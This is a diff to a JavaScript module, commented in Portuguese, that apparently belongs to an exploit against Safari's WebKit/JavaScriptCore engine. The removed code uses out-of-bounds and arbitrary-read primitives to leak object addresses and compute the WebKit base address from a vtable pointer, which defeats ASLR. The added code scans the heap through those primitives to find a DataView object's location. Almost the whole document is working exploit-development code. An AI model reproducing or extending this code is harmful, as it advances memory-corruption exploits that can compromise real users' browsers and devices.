@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 48 - Estratégia de Auto-Vazamento e Vtable)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 49 - Diagnóstico de Posição do DataView)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -8,10 +8,9 @@ import {
     arb_read,
     oob_read_absolute,
     isOOBReady,
-    selfTestOOBReadWrite,
-    oob_dataview_real
+    oob_dataview_real,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
 function isValidPointer(ptr) {
     if (!isAdvancedInt64Object(ptr)) return false;
@@ -21,73 +20,95 @@ function isValidPointer(ptr) {
     return true;
 }
 
-// ... (Estratégias antigas R43, R44, R45, R46 podem ser removidas ou mantidas como referência) ...
+async function read_cstring(address) {
+    let str = "";
+    for (let i = 0; i < 128; i++) {
+        const char_code = await arb_read(address, 1, i);
+        if (char_code === 0x00) break;
+        str += String.fromCharCode(char_code);
+    }
+    return str;
+}
+
+// ... (Estratégias antigas podem ser mantidas aqui) ...
 
 // ======================================================================================
-// NOVA ESTRATÉGIA (R48) - AUTO-VAZAMENTO E LEAK DE VTABLE
+// ESTRATÉGIA DE DIAGNÓSTICO (R49)
 // ======================================================================================
-export const FNAME_MODULE_SELF_LEAK_R48 = "SelfLeak_VTable_R48_WebKitLeak";
+export const FNAME_MODULE_DATAVIEW_SCANNER_R49 = "DataViewScanner_R49_Diagnostic";
 
-export async function executeSelfLeakAndVTableLeak_R48() {
-    const FNAME = FNAME_MODULE_SELF_LEAK_R48;
+async function find_and_log_all_objects_R49() {
+    if (!isOOBReady()) throw new Error("Ambiente OOB não está pronto para o escaneamento.");
+    
+    logS3(`[R49] Iniciando escaneamento de diagnóstico do heap...`, 'subtest');
+    
+    const CLASS_INFO_OFFSET = JSC_OFFSETS.Structure.CLASS_INFO_OFFSET;
+    const CLASS_INFO_CLASS_NAME_OFFSET = 0x8;
+    let found_objects = {};
+    let found_dataview_info = null;
+
+    for (let i = 0; i < OOB_CONFIG.ALLOCATION_SIZE - 0x10; i += 8) {
+        try {
+            const p_struct = oob_read_absolute(i, 8);
+            if (!isValidPointer(p_struct)) continue;
+            
+            const p_class_info = await arb_read(p_struct, 8, CLASS_INFO_OFFSET);
+            if (!isValidPointer(p_class_info)) continue;
+            
+            const p_class_name = await arb_read(p_class_info, 8, CLASS_INFO_CLASS_NAME_OFFSET);
+            if (!isValidPointer(p_class_name)) continue;
+            
+            const class_name = await read_cstring(p_class_name);
+            
+            if (class_name && class_name.length > 2) {
+                const object_addr = oob_dataview_real.buffer_addr.add(i);
+                
+                // Nós encontramos um DataView! Esta é a informação que precisamos.
+                if (class_name === "DataView") {
+                    logS3(`[R49 Scan] VITÓRIA! Encontrado 'DataView' no offset 0x${i.toString(16)}. Endereço: ${object_addr.toString(true)}`, 'vuln_major');
+                    found_dataview_info = {
+                        offset: i,
+                        address: object_addr.toString(true)
+                    };
+                }
+
+                if (!found_objects[class_name]) found_objects[class_name] = 0;
+                found_objects[class_name]++;
+            }
+
+        } catch (e) { /* Ignora e continua */ }
+    }
+
+    logS3(`[R49] Escaneamento concluído. Resumo dos objetos encontrados:`, 'good');
+    logS3(JSON.stringify(found_objects, null, 2), 'info');
+    
+    return found_dataview_info;
+}
+
+export async function executeDataViewScan_R49() {
+    const FNAME = FNAME_MODULE_DATAVIEW_SCANNER_R49;
     logS3(`--- Iniciando ${FNAME} ---`, "test");
-    let result = { success: false, msg: "Teste não concluído", stage: "init", webkit_base: null, addrof_ptr: null };
+    let result = { success: false, msg: "Escaneamento não encontrou o DataView.", dataview_offset: -1 };
 
     try {
-        // --- Fase 1: Setup e Sanity Check ---
-        result.stage = "Setup";
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
-        const sanityCheckOk = await selfTestOOBReadWrite(logS3);
-        if(!sanityCheckOk) throw new Error("Falha no teste de sanidade das primitivas R/W.");
-        logS3(`[R48] Ambiente OOB e primitivas prontos.`, 'good');
-
-        // --- Fase 2: Primitiva `addrof` por Auto-Vazamento ---
-        result.stage = "Addrof Self-Leak";
-        logS3(`[R48] Estágio A: Tentando obter 'addrof' por auto-vazamento...`, 'subtest');
         
-        const OOB_DV_METADATA_BASE = 0x58;
-        const ASSOCIATED_AB_OFFSET = JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET; // 0x08
+        const dv_info = await find_and_log_all_objects_R49();
 
-        // Lê o ponteiro para o objeto JSArrayBuffer que está dentro dos metadados do nosso DataView
-        const array_buffer_object_ptr = oob_read_absolute(OOB_DV_METADATA_BASE + ASSOCIATED_AB_OFFSET, 8);
-
-        if (!isValidPointer(array_buffer_object_ptr)) {
-            throw new Error(`Falha ao vazar o ponteiro do próprio ArrayBuffer. Valor lido: ${array_buffer_object_ptr.toString(true)}`);
+        if (dv_info) {
+            result.success = true;
+            result.dataview_offset = dv_info.offset;
+            result.msg = `SUCESSO! O objeto DataView foi encontrado no offset 0x${dv_info.offset.toString(16)}.`;
         }
-        result.addrof_ptr = array_buffer_object_ptr.toString(true);
-        logS3(`[R48] SUCESSO 'addrof'! Endereço do objeto ArrayBuffer: ${result.addrof_ptr}`, "vuln");
-
-        // --- Fase 3: Vazamento da Base do WebKit via Vtable ---
-        result.stage = "VTable Leak";
-        logS3(`[R48] Estágio B: Lendo a Vtable para vazar a base do WebKit...`, 'subtest');
-
-        // Ponteiro da Estrutura está no início do JSCell do ArrayBuffer
-        const p_structure = await arb_read(array_buffer_object_ptr, 8, JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-        if (!isValidPointer(p_structure)) throw new Error("Ponteiro da Estrutura inválido.");
-        logS3(`[R48] Ponteiro da Estrutura: ${p_structure.toString(true)}`, 'leak');
-        
-        // A vtable (ou um ponteiro para uma função virtual) está na própria Estrutura.
-        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET; // 0x18
-        const p_virtual_put_func = await arb_read(p_structure, 8, VIRTUAL_PUT_OFFSET);
-        if (!isValidPointer(p_virtual_put_func)) throw new Error("Ponteiro da função virtual 'put' inválido.");
-        logS3(`[R48] Ponteiro da Função Virtual (put): ${p_virtual_put_func.toString(true)}`, 'leak');
-        
-        // O endereço da função está dentro do módulo WebKit. Alinhar para o início da página nos dá a base.
-        const PAGE_MASK_4KB = new AdvancedInt64(0x0, ~0xFFF);
-        const webkit_base = p_virtual_put_func.and(PAGE_MASK_4KB);
-        
-        result.webkit_base = webkit_base.toString(true);
-        result.msg = `SUCESSO! Base do WebKit encontrada: ${result.webkit_base}`;
-        result.success = true;
-        logS3(`[R48] SUCESSO FINAL! Base do WebKit: ${result.webkit_base}`, "vuln_major");
 
     } catch (e) {
-        result.msg = `Falha no estágio '${result.stage}': ${e.message}`;
+        result.msg = `Erro crítico no escaneador de heap: ${e.message}`;
         logS3(`[${FNAME}] ERRO: ${result.msg}`, "critical");
         console.error(e);
     } finally {
-        await clearOOBEnvironment();
+        // Não limpa o ambiente para que possamos inspecionar se necessário
     }
+
     return result;
 }
